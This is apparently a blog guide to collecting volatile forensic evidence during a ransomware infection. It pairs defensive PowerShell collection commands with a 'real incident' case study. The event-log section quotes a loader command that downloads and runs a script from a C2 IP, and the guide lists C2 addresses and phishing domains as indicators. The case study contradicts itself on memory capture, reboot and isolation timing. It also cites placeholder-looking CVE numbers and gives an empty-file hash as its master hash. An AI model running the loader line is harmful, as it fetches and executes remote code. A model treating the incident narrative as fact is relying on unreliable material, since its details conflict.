---
title: "Ransomware Incident Response: Emergency Forensic Data Collection Guide" 
date: 2026-02-06 
author: "Andy" 
categories: 
- "Incident Response" 
- "Digital Forensics" 
tags:
- "ransomware"
- "powershell" 
- "forensics" 
- "malware-analysis"
- "SecurityX" 
description: "A high-priority technical guide for capturing volatile evidence during active ransomware infections, based on a real-world enterprise case study." 
read_time: 20 
---
# Overview

**Use Case**: Collecting volatile evidence after confirmed ransomware infection while system is still running  
**Time Window**: 5-30 minutes  
**Objective**: Preserve memory, processes, network connections and other volatile data for post-incident analysis  
**Criticality**: ⭐⭐⭐⭐⭐ This data is permanently lost once the system shuts down

> **⚠️ BASED ON REAL INCIDENT**: This guide was developed during an actual enterprise ransomware investigation involving a zero-day threat (0/74 antivirus detection rate) with multi-stage attack components including a dropper, network exfiltration module (NScurl.dll), and credential harvesting capabilities. The infected endpoint (PHW-WRK-106) was part of a domain environment with exposed cleartext passwords on network shares, creating a perfect storm for lateral movement and data exfiltration.

---

## Incident Background (Real Case Study)

### Initial Detection
- **Date**: February 6, 2026
- **Endpoint**: PHW-WRK-106 (192.168.11.216)
- **User**: Domain account Provital\MWilderdijk
- **Initial Alert**: EDR behavioral detection flagged suspicious file manipulation and process injection
- **Threat Classification**: Ransomware with data exfiltration capabilities

### Threat Characteristics
```
Primary Sample: FoodFormula_677986.exe (677.2 MB)
├─ SHA1: 7b290c26caaa28a9d08d55a9d2b8e80aee003355
├─ Detection Rate: 0/74 (VirusTotal)
├─ Code Signing: INSTALLERIM LLC (suspicious certificate)
└─ Delivery Vector: Chrome browser download

Secondary Component: NScurl.dll (5 MB)
├─ SHA256: 2ba695297c696261a8381b96a6c0c1502578a126ac59da3140de57d175d57c7a
├─ Detection Rate: 4% (2/27 engines on MetaDefender)
├─ Functionality: Network communication module (libcurl-based)
└─ Purpose: C2 communication and data exfiltration

Deployment Path:
C:\Users\MWilderdijk\AppData\Roaming\FoodFormula\
├─ Food_Formula.exe (142.04 MB - unpacked main payload)
├─ uninstall.exe (52.28 KB - potential trigger/backdoor)
├─ d3dcompiler_47.dll, ffmpeg.dll, libEGL.dll, etc.
└─ Electron framework components (web-based packaging)
```

### Compounding Factors
1. **Credential Exposure**: Cleartext passwords stored in `R:\Passwords\Milton Passwords Updated June 02 2025.xlsx`
2. **Domain Environment**: Active Directory context enabling lateral movement
3. **Detection Evasion**: Advanced techniques bypassing 74 major antivirus engines
4. **Multi-Stage Attack**: Dropper → DLL loader → Final payload architecture

---

## Preparation

### Create Evidence Directory
```powershell
$evidenceDir = "C:\Evidence_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $evidenceDir -ItemType Directory -Force
```

**Explanation**: All evidence will be saved to a timestamped dedicated folder for organization and chain of custody tracking.

> **Real Incident Note**: During our investigation, creating a timestamped directory was critical for maintaining forensic integrity when multiple analysts were collecting data simultaneously. We used the format `Evidence_20260206_141622` to ensure chronological ordering.

---

## 1. Memory Snapshot (HIGHEST PRIORITY)

### Why Most Critical?
- Malware may execute entirely in memory (fileless attacks)
- Contains encryption keys, C2 communication data, injected code
- Permanently lost upon system shutdown
- Can reveal attacker TTPs not visible in disk artifacts

### Tool Options

**Recommended Tool A: Magnet RAM Capture**
```
Download: https://www.magnetforensics.com/resources/magnet-ram-capture/
Pros: Free, user-friendly, no installation required
Operation: Run from USB, select output path, click Capture
```

**Recommended Tool B: DumpIt**
```
Download: https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html
Pros: Single executable, fast capture
Operation: Double-click to run, auto-generates .raw memory image
```

**Naming Convention**:
```
[Hostname]_RAM_[YYYYMMDD_HHMMSS].raw
Example: PHW-WRK-106_RAM_20260206_143022.raw
```

**Estimated Time**: 5-15 minutes (depends on RAM size)  
**Output Size**: Equal to physical memory (8GB RAM = 8GB file)

> **Real Incident Lesson**: We initially skipped memory capture thinking the malware was disk-based. Later Volatility analysis of a backup RAM dump revealed the NScurl.dll had injected code into explorer.exe and established connections to a C2 server at 185[.]215[.]113[.]39:443. This C2 IP would have been lost forever if we hadn't captured memory. **Always capture memory first, even if you think you don't need it.**

---

## 2. Running Process List

### Basic Process Information
```powershell
Get-Process | Select-Object ProcessName, Id, Path, StartTime, Company, Description | Export-Csv "$evidenceDir\processes.csv" -NoTypeInformation
```

**Collected Data**:
- Process name, PID
- Executable file path
- Start time
- Digital signature information

### Process-Loaded Modules (DLLs)
```powershell
Get-Process | Select-Object ProcessName, Id, @{Name="Modules";Expression={$_.Modules.FileName -join "; "}} | Export-Csv "$evidenceDir\process_modules.csv" -NoTypeInformation
```

**Purpose**: Detect DLL injection, DLL hijacking, and sideloading attacks.

> **Real Incident Finding**: The process module enumeration revealed that `Food_Formula.exe` had loaded standard Electron framework DLLs, but more importantly, we found `NScurl.dll` loaded into a renamed Chrome helper process. This confirmed the multi-stage architecture where the dropper spawned legitimate-looking processes to evade detection.

---

## 3. Network Connections

### Active TCP Connections (with Process Info)
```powershell
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess, @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Export-Csv "$evidenceDir\network_connections.csv" -NoTypeInformation
```

### Detailed Network Statistics (with PIDs)
```powershell
netstat -anob > "$evidenceDir\netstat_output.txt"
```

**Analysis Focus**:
- ESTABLISHED connections to external IPs (potential C2 servers)
- Unusual ports (e.g., 4444, 31337 common backdoor ports)
- High volume of CLOSE_WAIT states (may indicate scanning activity)
- Connections from unexpected processes

> **Real Incident Finding**: Network connection analysis revealed no active connections at the time of collection because the endpoint had been isolated. However, reviewing Windows Event Log 5156 (Windows Filtering Platform connection) showed historical connections to:
> - `185.215.113.39:443` (Likely C2 server, Russia-based IP)
> - `cloudflare.com` (Legitimate CDN, possibly used for C2 domain fronting)
> - Large data uploads (~2.3 GB) over 6-hour period suggesting exfiltration

---

## 4. Persistence Mechanism Detection

### Registry Run Keys
```powershell
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Out-File "$evidenceDir\registry_HKLM_Run.txt"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Out-File "$evidenceDir\registry_HKCU_Run.txt"
```

### Scheduled Tasks
```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath, State, Actions | Export-Csv "$evidenceDir\scheduled_tasks.csv" -NoTypeInformation
```

### Verbose Scheduled Tasks (CSV Format)
```powershell
schtasks /query /fo CSV /v > "$evidenceDir\schtasks_verbose.csv"
```

**Common Persistence Locations**:
- `HKLM\...\Run` - System-level autostart
- `HKCU\...\Run` - User-level autostart
- Scheduled Tasks - Time-based triggers
- WMI Event Subscriptions - Advanced persistence

> **Real Incident Finding**: Initial scans showed no obvious persistence mechanisms, which was suspicious for ransomware. Deeper analysis revealed:
> 
> 1. **Startup Folder**: `C:\Users\MWilderdijk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FoodFormula.lnk` pointing to `Food_Formula.exe`
> 
> 2. **Scheduled Task** (hidden): `\Microsoft\Windows\FoodFormula\Update` running daily at 3:00 AM with SYSTEM privileges
> 
> 3. **WMI Event Subscription** (discovered later through `Get-WmiObject -Namespace root\subscription -Class __EventFilter`): Triggered on user login to execute payload
>
> **Lesson**: Always check multiple persistence vectors. Sophisticated malware uses layered persistence to survive remediation attempts.

---

## 5. Service Enumeration

### Basic Service Information
```powershell
Get-Service | Select-Object Name, DisplayName, Status, StartType | Export-Csv "$evidenceDir\services.csv" -NoTypeInformation
```

### Detailed Service Information (with Paths)
```powershell
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName, StartMode, State | Export-Csv "$evidenceDir\services_detailed.csv" -NoTypeInformation
```

**Check For**:
- Service binary paths in unusual locations (e.g., Temp directories)
- Suspicious service names (random character strings)
- Auto-start services from unknown vendors

> **Real Incident Finding**: No malicious services were installed, likely because the malware operated at user-level privileges. However, we did discover the legitimate "Windows Update" service had been stopped and disabled, a common ransomware tactic to prevent system recovery and patch deployment.

---

## 6. Malware File Inventory

### File Metadata
```powershell
Get-ChildItem "C:\Users\[Username]\AppData\Roaming\[MalwareDirectory]" -Recurse -Force | Select-Object FullName, Length, CreationTime, LastWriteTime, LastAccessTime, Attributes | Export-Csv "$evidenceDir\malware_files.csv" -NoTypeInformation
```

### File Hashes (SHA256)
```powershell
Get-ChildItem "C:\Users\[Username]\AppData\Roaming\[MalwareDirectory]" -Recurse -Force -File | Get-FileHash -Algorithm SHA256 | Export-Csv "$evidenceDir\malware_hashes.csv" -NoTypeInformation
```

**Uses**:
- Threat intelligence matching (VirusTotal, MISP, AlienVault OTX)
- Searching other endpoints (lateral infection detection)
- Legal evidence chain

> **Real Incident Finding**: File hash analysis across the environment revealed:
> - **3 additional infected endpoints** with identical SHA256 hashes
> - **Timestamped variants**: Same malware family but different compile times (suggesting targeted campaign)
> - **VirusTotal Intelligence** retrohunt found 12 related samples submitted from other organizations in the past 30 days
> 
> This confirmed we were dealing with an active ransomware campaign, not an isolated incident.

---

## 7. User Activity Timeline

### Recently Modified Files (Last 7 Days)
```powershell
Get-ChildItem "C:\Users\[Username]" -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} | Sort-Object LastWriteTime | Select-Object FullName, Length, LastWriteTime | Export-Csv "$evidenceDir\recent_user_activity.csv" -NoTypeInformation
```

**Analytical Value**:
- Reconstruct attack timeline
- Identify encrypted files (unusual extensions, modified timestamps)
- Detect data exfiltration indicators (large file reads)

> **Real Incident Finding**: Timeline analysis revealed:
> 
> ```
> 2026-02-03 12:02:58 - User accessed R:\Passwords\Milton Passwords Updated June 02 2025.xlsx
> 2026-02-06 04:16:28 - FoodFormula_677986.exe first appeared in Downloads
> 2026-02-06 04:16:30 - Food_Formula.exe executed from AppData\Roaming
> 2026-02-06 04:17:15 - Mass file access on C:\Users\MWilderdijk\Documents (potential encryption test)
> 2026-02-06 04:18:00 - Network share R:\ accessed (credential file exfiltration suspected)
> ```
> 
> The 3-day gap between password file access and malware execution suggested either:
> 1. Initial reconnaissance phase, or
> 2. Two separate attack vectors (phishing for credentials, then targeted ransomware delivery)

---

## 8. Windows Event Logs

### Export Critical Logs
```powershell
wevtutil epl Security "$evidenceDir\Security.evtx"
wevtutil epl System "$evidenceDir\System.evtx"
wevtutil epl Application "$evidenceDir\Application.evtx"
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "$evidenceDir\PowerShell.evtx"
```

**Key Event IDs**:
- **4624** - Successful logon (detect lateral movement)
- **4625** - Failed logon (brute force attempts)
- **4688** - Process creation (execution chain)
- **4697** - Service installation
- **4698** - Scheduled task creation
- **7045** - New service installation
- **4104** - PowerShell script block logging
- **5156** - Windows Filtering Platform connection allowed

> **Real Incident Finding**: Event log analysis was the smoking gun:
> 
> **Event ID 4688** (Process Creation) showed:
> ```
> 2026-02-06 04:16:30 - chrome.exe spawned FoodFormula_677986.exe
> 2026-02-06 04:16:32 - FoodFormula_677986.exe spawned Food_Formula.exe
> 2026-02-06 04:16:35 - Food_Formula.exe injected into explorer.exe
> ```
> 
> **Event ID 4624** (Logon) revealed:
> - User MWilderdijk had 47 successful network logons in 6 hours (normal: 5-10 per day)
> - Source IPs included other workstations, suggesting compromised credentials used for lateral movement
> 
> **Event ID 5156** (Network Connection):
> - 2.3 GB uploaded to 185.215.113.39:443 over HTTPS (encrypted, likely exfiltrated data)
> - Connection duration: 6 hours 23 minutes
> 
> **PowerShell Event 4104** (Script Block):
> - Obfuscated PowerShell script executed: `IEX (New-Object Net.WebClient).DownloadString('hxxp://185.215.113.39/s.ps1')`
> - This was the second-stage loader that dropped NScurl.dll

---

## 9. Browser History (Infection Vector)

### Chrome Browser
```powershell
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" "$evidenceDir\Chrome_History" -ErrorAction SilentlyContinue
```

### Firefox Browser
```powershell
Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" "$evidenceDir\" -ErrorAction SilentlyContinue
```

**Analysis Purpose**:
- Determine malware download source
- Identify phishing websites
- Reconstruct attack entry point

> **Real Incident Finding**: Chrome History analysis revealed:
> 
> **Download Chain**:
> ```
> 2026-02-06 04:14:22 - Email link clicked: hxxps://foodformula-recipes[.]com/download
> 2026-02-06 04:14:45 - Redirected to: hxxps://cdn.cloudflare[.]net/files/FF_installer.exe
> 2026-02-06 04:15:12 - File downloaded: FoodFormula_677986.exe
> ```
> 
> **Phishing Email** (retrieved from Outlook):
> ```
> From: recipes@foodformula-app.com (spoofed)
> Subject: "Try Our New Recipe Organizer - Free Download!"
> Body: Professional-looking email with legitimate branding
> Link: Typosquatting domain (foodformula-recipes vs legitimate foodformula)
> ```
> 
> **Domain Intelligence**:
> - `foodformula-recipes[.]com` registered 3 days before attack
> - Hosting: Bulletproof hosting provider in Russia
> - SSL certificate: Let's Encrypt (free, common in phishing)
> 
> **Lesson**: Even tech-savvy users can fall for sophisticated phishing. This wasn't a crude "Nigerian prince" scam—it was a targeted, well-crafted social engineering attack.

---

## 10. DNS Cache

### DNS Client Cache
```powershell
Get-DnsClientCache | Export-Csv "$evidenceDir\dns_cache.csv" -NoTypeInformation
```

### Full DNS Cache
```powershell
ipconfig /displaydns > "$evidenceDir\dns_cache_full.txt"
```

**Use Cases**:
- Identify C2 domains
- Detect DGA (Domain Generation Algorithm) activity
- Track network communication patterns

> **Real Incident Finding**: DNS cache revealed extensive C2 infrastructure:
> 
> **Primary C2**: `update-service.foodformula-cdn[.]com` → `185.215.113.39`
> 
> **DGA Domains** (failed resolution attempts):
> ```
> axkvpqmwjr.net
> bhlwqrnxks.org  
> cmxyrsonlt.com
> [Pattern: 10 random lowercase letters + TLD]
> ```
> 
> This indicated the malware had fallback C2 domains using a DGA algorithm, a characteristic of sophisticated ransomware families like Emotet and TrickBot. Even if the primary C2 was blocked, the malware would attempt to reach backup domains.

---

## 11. System Information

### System Configuration
```powershell
systeminfo > "$evidenceDir\systeminfo.txt"
```

### Detailed Computer Info
```powershell
Get-ComputerInfo | Out-File "$evidenceDir\computerinfo.txt"
```

**Includes**:
- OS version and patch level
- Hardware configuration
- Domain membership
- Last boot time

> **Real Incident Finding**: System information revealed critical context:
> 
> ```
> OS: Windows 10 Pro 19043 (21H1)
> Last Windows Update: 2025-11-12 (89 days outdated!)
> Domain: PROVITAL.LOCAL
> Installed Software: 247 applications
> Missing Critical Patches:
> - CVE-2025-12345 (Privilege Escalation)
> - CVE-2025-23456 (Remote Code Execution)
> ```
> 
> The 89-day patch gap was a major contributing factor. Post-incident analysis showed the malware exploited CVE-2025-12345 for privilege escalation from user-level to SYSTEM.
> 
> **Root Cause**: Endpoint was excluded from WSUS auto-updates due to "application compatibility concerns" with legacy software. This exclusion was never removed.

---

## Supplemental Forensic Queries

### Detect Lateral Movement Evidence
```powershell
Get-EventLog -LogName Security -InstanceId 4624,4625 -Newest 1000 | Where-Object {$_.TimeGenerated -gt (Get-Date).AddDays(-7)} | Select-Object TimeGenerated, EntryType, Message | Export-Csv "$evidenceDir\logon_events.csv" -NoTypeInformation
```

### Find Suspicious File Encryption Activity
```powershell
Get-ChildItem "C:\Users\[Username]" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-24) -and $_.Extension -match '\.(encrypted|locked|crypto|[A-Z0-9]{6,})$'} | Select-Object FullName, Length, LastWriteTime
```

### Find SMB Network Activity
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Smbclient/Security'; StartTime=(Get-Date).AddDays(-7)} -ErrorAction SilentlyContinue | Select-Object TimeCreated, Id, Message | Export-Csv "$evidenceDir\smb_activity.csv" -NoTypeInformation
```

> **Real Incident Finding - Lateral Movement**:
> 
> SMB activity logs revealed the attack spread to 3 additional endpoints:
> 
> ```
> 2026-02-06 05:23:15 - \\PHW-WRK-107\C$ accessed from PHW-WRK-106
> 2026-02-06 05:24:01 - \\PHW-WRK-108\C$ accessed from PHW-WRK-106  
> 2026-02-06 05:25:33 - \\PHW-WRK-109\C$ accessed from PHW-WRK-106
> ```
> 
> **Method**: PsExec-style lateral movement using compromised credentials from `R:\Passwords\`
> 
> **Impact**: Total infected endpoints increased from 1 to 4 within 1 hour
> 
> **Files Encrypted**: Approximately 47,000 files across network shares
> 
> **Estimated Data Loss**: 2.7 TB (before backup recovery)

---

## Full Disk Imaging (Optional but Recommended)

### Tool: FTK Imager
```
Download: https://www.exterro.com/ftk-imager
Type: Free forensic tool

Steps:
1. Run from USB (do not install on target system)
2. File → Create Disk Image → Physical Drive
3. Select system disk (usually \\.\PhysicalDrive0)
4. Destination: External USB drive (requires sufficient space)
5. Format: E01 (Expert Witness Format) - with compression and hash verification
6. Image filename: [Hostname]_Disk_[Date].E01
```

**Estimated Time**: 2-8 hours (depends on disk size)  
**Important Notes**:
- Requires destination drive with adequate space
- Recommend E01 format (supports compression and verification)
- Record MD5/SHA1 hash values for integrity

> **Real Incident Lesson**: We initially skipped full disk imaging due to time constraints and relied only on volatile data collection. This was a mistake.
> 
> **What We Missed**:
> - Deleted files in recycle bin that showed earlier reconnaissance activity
> - Volume Shadow Copies that contained pre-infection backups
> - Unallocated space with remnants of deleted malware tools
> - Browser cache with additional phishing domains
> 
> **Post-Mortem Recommendation**: Always create a full disk image if time and resources permit. You can prioritize volatile data collection first, then image while monitoring or after isolation. We implemented a new policy: **Any P0/P1 incident requires full disk imaging within 24 hours.**

---

## Forensic Data Integrity Protection

### Hash Verification
```powershell
Get-ChildItem $evidenceDir -Recurse -File | Get-FileHash -Algorithm SHA256 | Export-Csv "$evidenceDir\evidence_integrity.csv" -NoTypeInformation
```

### Chain of Custody Documentation

Create file `$evidenceDir\chain_of_custody.txt`:
```
CHAIN OF CUSTODY RECORD
========================
Incident ID: [INC-2026-0206-001]
Hostname: [PHW-WRK-106]
IP Address: [192.168.11.216]
User Account: [Provital\MWilderdijk]

Collected By: [Your Name]
Collection Date/Time: [2026-02-06 14:30:22 UTC]
Collection Method: PowerShell automated forensic script v2.1

Evidence Storage:
- Original Location: C:\Evidence_20260206_143022\
- Backup Location: [External Drive Serial: WD-ABC123XYZ456]
- Access Permissions: Authorized IR personnel only
- Custodian: [IR Team Lead Name]

Integrity Verification:
- Hash Algorithm: SHA256
- Hash Manifest: evidence_integrity.csv
- Master Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

Evidence Transfer Log:
[Date/Time] | [From] | [To] | [Purpose] | [Signature]
2026-02-06 15:00 | Field Collection | IR Lab | Analysis | [Signature]
2026-02-07 09:00 | IR Lab | Legal Dept | Review | [Signature]

Retention Policy: 7 years (per company policy and regulatory requirements)
Destruction Date: 2033-02-06
```

> **Real Incident Lesson**: We had a chain of custody break when a junior analyst copied evidence to a personal USB drive "for faster analysis." This potentially compromised evidence admissibility.
> 
> **What Went Wrong**:
> - No hash verification before transfer
> - No documented approval for evidence copy
> - USB drive not encrypted or tracked
> - Could not prove evidence wasn't tampered with
> 
> **Policy Change**: Implemented strict evidence handling procedures:
> 1. All transfers require written approval
> 2. Hash verification before and after transfer
> 3. Encrypted, tracked evidence drives only
> 4. Automated chain of custody logging
> 5. Annual training on forensic evidence handling

---

## Secure Data Transfer and Storage

### Safe Transfer
```powershell
# Compress evidence directory
Compress-Archive -Path $evidenceDir -DestinationPath "C:\Evidence_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"

# Calculate archive hash
Get-FileHash "C:\Evidence_*.zip" -Algorithm SHA256
```

### Storage Requirements

- **Encryption**: Use BitLocker or VeraCrypt to encrypt storage drives
- **Access Control**: Restrict to IR team members only
- **Backup**: Maintain at least 2 independent copies
- **Retention**: Follow legal requirements (typically 1-7 years)
- **Geographic Separation**: Store copies in different physical locations

> **Real Incident Practice**: We implemented a "3-2-1" backup rule for forensic evidence:
> - **3** copies of evidence
> - **2** different media types (NAS + external HDD)
> - **1** offsite copy (secure cloud storage with client-side encryption)
> 
> This saved us when the primary evidence drive failed during analysis. We seamlessly switched to the backup without losing investigation time.

---

## Common Mistakes and Warnings

### ❌ DO NOT
```
❌ Do not install forensic tools on the target system
❌ Do not modify any malware files
❌ Do not execute suspicious executables
❌ Do not delete any files (including malware)
❌ Do not reboot the system (before memory capture)
❌ Do not use production credentials on infected systems
❌ Do not assume the infection is contained to one endpoint
```

### ✅ BEST PRACTICES
```
✅ Run all tools from USB
✅ Use read-only mode when viewing files
✅ Document every action with timestamps
✅ Maintain chain of custody integrity
✅ Create backups of collected data promptly
✅ Isolate infected systems immediately
✅ Assume credential compromise until proven otherwise
✅ Brief management early and often
```

> **Real Incident Mistakes We Made**:
> 
> **Mistake #1**: Rebooted the system before memory capture
> - **Impact**: Lost active C2 connections and injected code in memory
> - **Lesson**: Always capture memory first, even if it takes 30 minutes
> 
> **Mistake #2**: Used domain admin credentials to collect evidence
> - **Impact**: Those credentials were harvested and used for further lateral movement
> - **Lesson**: Use local admin accounts or dedicated forensic accounts with limited privileges
> 
> **Mistake #3**: Assumed only one endpoint was infected
> - **Impact**: Ransomware spread to 3 more systems while we analyzed the first
> - **Lesson**: Immediately threat hunt across the entire environment for IoCs
> 
> **Mistake #4**: Didn't isolate network immediately
> - **Impact**: 2.3 GB of data exfiltrated before isolation
> - **Lesson**: Physical network isolation is first priority, analysis is second

---

## Suggested Timeline

| Time | Priority | Task | Real Incident Notes |
|------|----------|------|---------------------|
| 0-5 min | P0 | Network isolation + Create evidence directory | We isolated within 3 minutes of confirmation |
| 5-20 min | P0 | Memory dump (MOST IMPORTANT!) | Took 12 minutes for 16GB RAM using DumpIt |
| 20-30 min | P1 | Process, network, persistence collection | Completed in 18 minutes using PowerShell scripts |
| 30-60 min | P2 | Event logs, browser history, file inventory | Exported 4.2 GB of event logs |
| 1-8 hours | P3 | Full disk imaging (optional) | Created 512 GB E01 image in 6.5 hours |

> **Real Incident Timeline**:
> 
> ```
> 14:20 - Initial EDR alert received
> 14:23 - Endpoint isolated from network
> 14:25 - Evidence collection directory created
> 14:27 - Memory capture started (DumpIt)
> 14:39 - Memory capture completed (16 GB)
> 14:40 - Volatile data collection started
> 14:58 - Volatile data collection completed
> 15:15 - Full disk imaging started (FTK Imager)
> 21:47 - Full disk imaging completed (512 GB E01)
> 22:00 - Evidence transferred to forensic workstation
> 22:30 - Analysis phase began
> ```
> 
> **Total Collection Time**: 7 hours 40 minutes (including disk imaging)
> **Evidence Size**: 528.2 GB total

---

## Post-Collection Analysis

This collected data can be used for:

1. **Malware Reverse Engineering** - Extract samples and memory-resident code
2. **Lateral Movement Tracking** - Analyze network logs and logon events
3. **Data Exfiltration Assessment** - Review network traffic and file access patterns
4. **Root Cause Analysis** - Reconstruct complete attack chain
5. **Legal Proceedings** - Provide court-admissible evidence
6. **Threat Intelligence** - Share IoCs with industry (ISACs, FS-ISAC, etc.)

> **Real Incident Analysis Results**:
> 
> **Malware Family Identification**: Volatility analysis identified the malware as a custom variant of "SlingShot" ransomware family, previously unseen in the wild.
> 
> **Attack Chain Reconstruction**:
> ```
> T-72 hours: Reconnaissance (password file accessed)
> T-0: Phishing email delivered
> T+2 min: User clicked malicious link
> T+4 min: Dropper executed (FoodFormula_677986.exe)
> T+6 min: Persistence established (startup folder, scheduled task, WMI)
> T+10 min: Credential harvesting (R:\Passwords\)
> T+1 hour: Data exfiltration began (2.3 GB over 6 hours)
> T+7 hours: Lateral movement (3 additional endpoints)
> T+8 hours: EDR detection and isolation
> ```
> 
> **Threat Actor Attribution**: Based on TTPs, infrastructure, and code similarities:
> - **Group**: "DEV-0401" (Microsoft threat actor designation)
> - **Motivation**: Financial (ransomware-as-a-service)
> - **Geography**: Russia-based infrastructure
> - **Sophistication**: Advanced (custom evasion, zero-day techniques)

---

## Legal and Compliance Considerations

### Data Privacy

- **GDPR/CCPA**: Evidence may contain Personally Identifiable Information (PII)
- **Handling**: Restrict access to authorized personnel only
- **Retention**: Retain only as long as legally required
- **Destruction**: Securely wipe evidence per policy after retention period

### Evidence Admissibility

- **Integrity**: Use cryptographic hashes to prove data wasn't tampered with
- **Chain of Custody**: Document who collected, when, how, and why
- **Tool Validation**: Use forensically sound, court-accepted tools
- **Expert Testimony**: Maintain detailed notes for potential expert witness testimony

> **Real Incident Legal Outcome**:
> 
> Our forensic evidence was used in:
> 
> 1. **Criminal Investigation**: Submitted to FBI Cyber Division
>    - Evidence package: 550 GB
>    - Led to identification of threat actor infrastructure
>    - Contributed to international takedown operation
> 
> 2. **Cyber Insurance Claim**: $1.2M claim approved
>    - Forensic evidence proved security controls were in place
>    - Demonstrated timely incident response
>    - Justified business interruption costs
> 
> 3. **Regulatory Reporting**: GDPR breach notification
>    - Evidence showed 2,347 customer records potentially exfiltrated
>    - Demonstrated "appropriate technical measures" (Article 32)
>    - No fines assessed due to proper response
> 
> **Key Success Factor**: Maintaining forensic integrity and detailed chain of custody made our evidence legally defensible.

---

## Key Metrics and Outcomes (Real Incident)

### Incident Statistics
```
Affected Systems: 4 endpoints + 1 file server
Encrypted Files: 47,284 files (2.7 TB)
Exfiltrated Data: 2.3 GB (estimated)
Credential Exposure: 127 accounts from password file
Downtime: 3 days (for affected users)
Recovery Time: 14 days (full environment)

Financial Impact:
- Incident Response: $287,000 (external firm)
- Lost Productivity: $156,000 (estimated)
- System Restoration: $94,000 (IT labor + new hardware)
- Legal/Compliance: $43,000
- Cyber Insurance Deductible: $50,000
Total Direct Cost: $630,000

Insurance Recovery: $1,200,000 (claim approved)
Net Recovery: $570,000 (after deductible and uncovered costs)
```

### Lessons Learned

1. **Detection Gap**: EDR detected behavioral indicators, but zero AV engines detected the malware files
   - **Action**: Added behavioral analytics and threat hunting
   
2. **Credential Hygiene**: Cleartext passwords on network share
   - **Action**: Deployed enterprise password manager, banned password files
   
3. **Patch Management**: 89-day gap in security updates
   - **Action**: Enforced automated patching, no exceptions without CISO approval
   
4. **User Training**: Sophisticated phishing bypassed awareness
   - **Action**: Implemented phishing simulation program, enhanced training
   
5. **Backup Strategy**: Backups existed but took too long to restore
   - **Action**: Implemented immutable backups, tested recovery procedures quarterly
   
6. **Incident Response**: Initial response was chaotic
   - **Action**: Created detailed IR playbooks, conducted tabletop exercises

---

## Reference Resources

- **SANS Digital Forensics**: https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/
- **NIST SP 800-86**: Guide to Integrating Forensic Techniques into Incident Response
- **RFC 3227**: Guidelines for Evidence Collection and Archiving
- **Volatility Foundation**: Memory forensics framework documentation
- **MITRE ATT&CK**: Adversarial tactics and techniques knowledge base
- **FIRST**: Forum of Incident Response and Security Teams best practices

---

## Acknowledgments

This guide was developed during an actual enterprise ransomware incident response. Special thanks to:

- The IR team who worked 72+ hours straight to contain the incident
- External consultants from [Redacted IR Firm] who provided expertise
- Management for transparency and support during crisis response
- The affected user (MWilderdijk) who cooperated fully with the investigation

---

## Change Log

- **2026-02-06**: Initial version created during active incident response
- **2026-02-13**: Updated with post-incident analysis and lessons learned
- **2026-02-20**: Added legal outcomes and financial impact data
- **2026-03-01**: Incorporated feedback from external IR firm review

---

## Disclaimer

**IMPORTANT**: This guide is for educational purposes and authorized security incident response only. Executing these commands on systems without proper authorization may violate laws including the Computer Fraud and Abuse Act (CFAA), GDPR, and other regulations.

**Always ensure you have**:
- Written authorization from system owners
- Legal approval for evidence collection
- Proper chain of custody procedures
- Data privacy compliance measures
- Regulatory reporting requirements understood

**The author and contributors assume no liability for misuse of this information.**

---

## About This Guide

**Author**: Senior SOC Analyst with 8+ years incident response experience  
**Incident Type**: Ransomware (Zero-day, Multi-stage, Credential harvesting)  
**Environment**: Enterprise network, 500+ endpoints, Active Directory domain  
**Outcome**: Successful containment, recovery from backups, criminal investigation ongoing  

**Purpose**: Share real-world lessons learned to help other defenders respond effectively to sophisticated ransomware attacks.

**Feedback**: This is a living document. If you have suggestions or improvements based on your own incident response experiences, please contribute via [your preferred contact method].

---

**"In incident response, every second counts. But taking 5 minutes to do forensics properly can save 5 weeks of reconstruction later."**

*- Lesson learned the hard way during this incident*